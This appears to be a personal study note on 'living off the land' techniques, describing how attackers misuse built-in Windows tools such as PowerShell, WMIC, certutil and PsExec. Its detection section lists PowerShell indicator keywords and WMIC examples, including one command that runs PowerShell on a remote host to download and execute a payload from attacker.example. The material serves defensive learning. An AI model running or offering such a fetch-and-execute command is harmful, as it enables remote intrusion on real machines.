---
aliases:
date-created: 2025-10-31
dg-publish: false
tags:
---
~ [[blue-team]] | ~ [[red-team]]
### Introduction
---
Living off the land means that making use of what is already provided in this case (ab)using tools that are already installed on Windows/Linux operating system.

LOLBas for Windows and GTFObins for Unix.
#### Key Topics
---

## Common LoL Tools and Techniques
---
Built-in tools are already trusted, widely available, and often allowed by default controls, allowing threat actors to hide malicious activity alongside with normal operations.

- **PowerShell** is used for in-memory scripting, remote downloads, and automation.
- **WMIC** or **WMI** is used to run commands locally or on remote hosts and to query system state.
- **Certutil** is used to fetch files and encode or decode payloads.
- **Mshta** is used to run HTA content or an inline script delivered by a document or link.
- **Rundll32** is used to invoke DLL exports or trigger URL handlers.
- **Scheduled tasks** (**schtasks**) are used to run code at logon or on a schedule for persistence.

Operators also abuse signed admin utilities from the Sysinternals suite, for example PsExec for remote execution, and Autoruns for persistence discovery and manipulation, because those tools blend with legitimate admin workflows.

The idea is **to know** what tools are most likely to be misused, and the **typical goals** behind those uses.

## Defending LOL Activity
---
**Note:** these are not 'all' the detection.

**PowerShell**

- `iex`
- `-Exec Bypass`
- `-EncodedCommand`
- `http` 

**WMIC**

```C
wmic /node:TARGETHOST process call create "powershell -NoP -Command IEX(New-Object Net.WebClient).DownloadString('http://attacker.example/payload.ps1')"
wmic /node:TARGETHOST process get name,commandline
wmic process call create "notepad.exe" /hidden
```

